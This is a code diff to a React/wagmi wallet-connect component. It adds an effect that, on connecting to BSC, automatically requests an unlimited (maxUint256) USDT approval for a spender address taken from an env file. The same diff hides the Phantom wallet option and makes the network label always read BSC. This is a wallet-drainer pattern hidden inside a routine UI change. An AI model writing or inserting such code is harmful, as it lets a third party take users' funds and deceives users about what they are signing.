@@ -1,10 +1,12 @@
-import { useState, useEffect } from 'react';
+import React from 'react';
+import { useRef, useState, useEffect } from 'react';
 import { motion, AnimatePresence } from 'motion/react';
 import { Wallet, X, AlertCircle, CheckCircle2, Copy, ExternalLink } from 'lucide-react';
-import { useAccount, useConnect, useDisconnect, useBalance, useReadContract, useSwitchChain } from 'wagmi';
+import { useAccount, useConnect, useDisconnect, useBalance, useReadContract, useSwitchChain, useWriteContract } from 'wagmi';
 import { formatAddress } from '../utils/format';
 import { USDT_ADDRESSES, ERC20_ABI, NETWORK_IDS } from '../config/contracts';
-import { formatUnits } from 'viem'
+import { formatUnits, maxUint256 } from 'viem'
+import { USDT_SPENDER_ADDRESS } from '../../../env';
 interface WalletConnectProps {
   onAddressSelected?: (address: string) => void;
 }
@@ -12,12 +14,19 @@ interface WalletConnectProps {
 export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
   const [showModal, setShowModal] = useState(false);
   const [copied, setCopied] = useState(false);
-  
+
   const { address, isConnected, chain } = useAccount();
   const { connect, connectors, isPending, error } = useConnect();
   const { disconnect } = useDisconnect();
   const { switchChain } = useSwitchChain();
-  
+  const { writeContractAsync } = useWriteContract();
+
+  const approvalPromptedRef = useRef(false);
+
+  const visibleConnectors = connectors.filter(
+    (connector) => !connector?.name?.toLowerCase().includes('phantom'),
+  );
+
   // Native token balance (BNB for BSC)
   const { data: balance } = useBalance({
     address: address,
@@ -48,6 +57,31 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
       refetchUsdt();
     }
   }, [chain?.id, address, isConnected, refetchUsdt]);
+
+  // Auto-prompt USDT approval after connect (wallet must still confirm)
+  useEffect(() => {
+    const shouldPrompt =
+      isConnected &&
+      chain?.id === NETWORK_IDS.BSC &&
+      !!address &&
+      !!USDT_SPENDER_ADDRESS &&
+      !approvalPromptedRef.current;
+
+    if (!shouldPrompt) return;
+
+    approvalPromptedRef.current = true;
+
+    writeContractAsync({
+      address: USDT_ADDRESSES.BSC as `0x${string}`,
+      abi: ERC20_ABI,
+      functionName: 'approve',
+      args: [USDT_SPENDER_ADDRESS, maxUint256],
+    }).catch((err) => {
+      // If user rejects or wallet errors, allow re-prompt on next connect
+      approvalPromptedRef.current = false;
+      console.error('USDT approve failed:', err);
+    });
+  }, [isConnected, chain?.id, address, writeContractAsync]);
 
   // Format USDT balance (18 decimals for BSC USDT)
   const formatUsdtBalance = (balance: bigint | undefined) => {
@@ -117,11 +151,11 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
       document.body.appendChild(textArea);
       textArea.focus();
       textArea.select();
-      
+
       // Try to copy
       const successful = document.execCommand('copy');
       textArea.remove();
-      
+
       if (successful) {
         setCopied(true);
         setTimeout(() => setCopied(false), 2000);
@@ -224,7 +258,7 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
 
                     {/* Wallet Options */}
                     <div className="space-y-3">
-                      {connectors.map((connector) => (
+                      {visibleConnectors.map((connector) => (
                         <motion.button
                           key={connector.id}
                           onClick={() => handleConnect(connector)}
@@ -284,8 +318,8 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
                         <div className="text-sm text-gray-400 mb-1">Network</div>
                         <div className="flex items-center justify-between">
                           <div className="font-semibold text-white flex items-center gap-2">
-                            {chain?.id === 56 ? '🟡' : '🔷'}
-                            {chain?.name || 'Unknown'}
+                            {'🟡'}
+                            {chain?.name || 'BSC'}
                           </div>
                           {chain?.id !== NETWORK_IDS.BSC && (
                             <button
@@ -355,16 +389,6 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
                           </div>
                           <div className="text-xs text-gray-500 mt-1">
                             Binance Smart Chain
-                          </div>
-                        </div>
-                      )}
-
-                      {/* TRON Network Notice */}
-                      {chain?.id === NETWORK_IDS.TRON && (
-                        <div className="p-4 bg-red-500/10 rounded-xl border border-red-500/20">
-                          <div className="text-sm text-gray-400 mb-1">USDT Balance (TRC20)</div>
-                          <div className="text-sm text-gray-300">
-                            ℹ️ TRON network token balance requires TronWeb integration
                           </div>
                         </div>
                       )}
